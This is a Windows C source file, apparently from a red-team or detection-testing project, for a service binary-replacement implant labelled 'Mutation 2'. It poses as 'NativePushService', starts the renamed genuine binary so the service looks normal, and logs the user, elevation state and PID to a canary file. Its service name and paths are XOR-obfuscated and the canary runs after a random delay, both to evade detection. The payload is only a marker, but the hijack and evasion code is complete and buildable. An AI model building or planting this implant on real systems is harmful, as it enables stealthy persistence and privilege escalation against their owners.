/*
 * svc_m2.c -- Mutation 2: XOR string obfuscation + execution flow mutation
 * Strategy 2 + Strategy 4 from MUTATION_GUIDE.md
 * Service name and canary path XOR-encoded (key 0x41)
 * Canary runs in separate thread with random delay
 *
 * Build: cl.exe svc_m2.c /Fe:svc_m2.exe /Ox /GS- /link advapi32.lib user32.lib
 */

#include <windows.h>

static SERVICE_STATUS g_ss;
static SERVICE_STATUS_HANDLE g_sh;

static void xd(char *d, const unsigned char *s, int n, unsigned char k)
{
    int i;
    for (i = 0; i < n; i++) d[i] = s[i] ^ k;
    d[n] = 0;
}

/* "C:\ProgramData\wsu_check.log" XOR 0x41 */
static const unsigned char e_cp[] = {
    'C'^0x41, ':'^0x41, '\\'^0x41, 'P'^0x41, 'r'^0x41, 'o'^0x41,
    'g'^0x41, 'r'^0x41, 'a'^0x41, 'm'^0x41, 'D'^0x41, 'a'^0x41,
    't'^0x41, 'a'^0x41, '\\'^0x41, 'w'^0x41, 's'^0x41, 'u'^0x41,
    '_'^0x41, 'c'^0x41, 'h'^0x41, 'e'^0x41, 'c'^0x41, 'k'^0x41,
    '.'^0x41, 'l'^0x41, 'o'^0x41, 'g'^0x41
};

/* "NativePushService" XOR 0x41 */
static const unsigned char e_sn[] = {
    'N'^0x41, 'a'^0x41, 't'^0x41, 'i'^0x41, 'v'^0x41, 'e'^0x41,
    'P'^0x41, 'u'^0x41, 's'^0x41, 'h'^0x41, 'S'^0x41, 'e'^0x41,
    'r'^0x41, 'v'^0x41, 'i'^0x41, 'c'^0x41, 'e'^0x41
};

/* "WsNativePushService_real.exe" XOR 0x41 */
static const unsigned char e_re[] = {
    'W'^0x41, 's'^0x41, 'N'^0x41, 'a'^0x41, 't'^0x41, 'i'^0x41,
    'v'^0x41, 'e'^0x41, 'P'^0x41, 'u'^0x41, 's'^0x41, 'h'^0x41,
    'S'^0x41, 'e'^0x41, 'r'^0x41, 'v'^0x41, 'i'^0x41, 'c'^0x41,
    'e'^0x41, '_'^0x41, 'r'^0x41, 'e'^0x41, 'a'^0x41, 'l'^0x41,
    '.'^0x41, 'e'^0x41, 'x'^0x41, 'e'^0x41
};

static DWORD WINAPI td(LPVOID p)
{
    HANDLE fh;
    DWORD bw;
    char ob[256];
    int ol;
    SYSTEMTIME st;
    char un[64];
    DWORD us = 64;
    BOOL ev = FALSE;
    HANDLE tk;
    char cp[64];

    (void)p;

    Sleep(2000 + (GetTickCount() % 3000));

    GetLocalTime(&st);
    GetUserNameA(un, &us);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tk)) {
        TOKEN_ELEVATION ei;
        DWORD rs;
        if (GetTokenInformation(tk, TokenElevation, &ei, sizeof(ei), &rs))
            ev = ei.TokenIsElevated;
        CloseHandle(tk);
    }

    ol = wsprintfA(ob, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|BINARY_REPLACE\r\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        un, ev, GetCurrentProcessId());

    xd(cp, e_cp, sizeof(e_cp), 0x41);

    fh = CreateFileA(cp,
        GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh != INVALID_HANDLE_VALUE) {
        SetFilePointer(fh, 0, NULL, FILE_END);
        WriteFile(fh, ob, ol, &bw, NULL);
        CloseHandle(fh);
    }
    return 0;
}

static void rp(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char mp[MAX_PATH];
    char rn[64];
    char *ls;

    GetModuleFileNameA(NULL, mp, MAX_PATH);
    ls = mp;
    for (char *c = mp; *c; c++) {
        if (*c == '\\') ls = c;
    }
    *(ls + 1) = '\0';

    xd(rn, e_re, sizeof(e_re), 0x41);
    lstrcatA(mp, rn);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcessA(mp, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

static void WINAPI hc(DWORD cc)
{
    switch (cc) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_ss.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    SetServiceStatus(g_sh, &g_ss);
}

static void WINAPI sm(DWORD ac, LPSTR *av)
{
    char sn[32];
    (void)ac; (void)av;

    xd(sn, e_sn, sizeof(e_sn), 0x41);
    g_sh = RegisterServiceCtrlHandlerA(sn, hc);
    if (!g_sh) return;

    g_ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ss.dwCurrentState = SERVICE_RUNNING;
    g_ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ss.dwWin32ExitCode = 0;
    SetServiceStatus(g_sh, &g_ss);

    rp();
    CreateThread(NULL, 0, td, NULL, 0, NULL);

    while (g_ss.dwCurrentState == SERVICE_RUNNING) {
        Sleep(5000);
    }
}

int main(void)
{
    char sn[32];
    SERVICE_TABLE_ENTRYA dt[2];

    xd(sn, e_sn, sizeof(e_sn), 0x41);
    dt[0].lpServiceName = sn;
    dt[0].lpServiceProc = sm;
    dt[1].lpServiceName = NULL;
    dt[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcherA(dt);
    return 0;
}
